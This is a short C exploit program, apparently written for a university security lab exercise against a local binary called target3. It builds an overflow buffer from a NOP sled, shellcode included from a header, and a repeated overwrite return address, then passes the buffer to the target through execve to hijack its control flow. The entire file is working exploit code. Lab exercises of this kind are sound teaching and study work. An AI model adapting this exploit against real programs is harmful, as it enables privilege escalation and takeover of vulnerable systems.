#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char temp[72];
	char tem[4] = "\x54\xfe\x21\x20";
	int i;
	for(i=0;i<72;i++){
		if (i<3) temp[i]=0X90;
		else if (i<48) temp[i]=shellcode[i-3];
		else if (i<72) temp[i]=tem[(i-48)%4];
	}

	args[0] = TARGET;
	args[1] = temp;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
